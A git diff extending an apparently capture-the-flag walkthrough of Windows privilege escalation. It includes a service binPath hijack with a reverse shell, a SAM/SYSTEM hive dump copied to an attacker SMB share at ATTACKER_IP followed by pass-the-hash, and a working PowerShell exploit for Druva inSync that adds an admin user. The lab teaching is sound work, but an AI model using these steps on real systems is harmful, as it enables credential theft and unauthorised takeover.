@@ -78,11 +78,55 @@ Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permiss
 Remember to grant permissions to Everyone to execute your payload: `icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`. Now from cmd: `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`, and, after setting a netcat listener, restart the service to get the flag: `THM{INSECURE_SVC_CONFIG}`
 
 ### Abusing dangerous privileges
-- Get the flag on the Administrator's desktop.
+- Get the flag on the Administrator's desktop.<br />
+Connect to the machine via RDP with the following command: `xfreerdp /u:THMBackup /p:CopyMaster555 /v:Target_IP`. Now run `whoami /priv` to check what permissions we have:<br />
+![image](https://github.com/user-attachments/assets/48edef86-bfaa-4f08-b1b5-5c503423987c)<br />
+As we can see have SeBackup / SeRestore available. So let's follow the steps provided in the task, and retrieve password hashes:
+
+            reg save hklm\system C:\Users\THMBackup\system.hive
+            reg save hklm\sam C:\Users\THMBackup\sam.hive
+This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB. We can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox. 
+
+            mkdir share
+            python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox:
+            
+            copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+            copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+And use impacket to retrieve the users' password hashes:<br />
+![image](https://github.com/user-attachments/assets/911c0de8-f383-4873-b552-598fb4dff3e4)<br />
+We can finally use the Administrator's hash to perform a **Pass-the-Hash** attack and gain access to the target machine with SYSTEM privileges: <br />
+![image](https://github.com/user-attachments/assets/8dd9d33e-420e-4b0f-a906-770a7abc9913)<br />
+`THM{SEFLAGPRIVILEGE}`
 
 ### Abusing vulnerable software
-- Get the flag on the Administrator's desktop.
+- Get the flag on the Administrator's desktop. <br />
+Run the following code in powershell:
 
-### 
+            $ErrorActionPreference = "Stop"
+            
+            $cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
+            
+            $s = New-Object System.Net.Sockets.Socket(
+                [System.Net.Sockets.AddressFamily]::InterNetwork,
+                [System.Net.Sockets.SocketType]::Stream,
+                [System.Net.Sockets.ProtocolType]::Tcp
+            )
+            $s.Connect("127.0.0.1", 6064)
+            
+            $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+            $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+            $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+            $length = [System.BitConverter]::GetBytes($command.Length);
+            
+            $s.Send($header)
+            $s.Send($rpcType)
+            $s.Send($length)
+            $s.Send($command)
+Now open cmd as administrator: <br />
+![image](https://github.com/user-attachments/assets/077c43b8-b402-4196-a118-39cbf1add669)<br />
+![image](https://github.com/user-attachments/assets/1c48b90d-317d-4dbf-81ad-32d68794e1e4)<br />
+`THM{EZ_DLL_PROXY_4ME}`
 
-### 
+                  
+
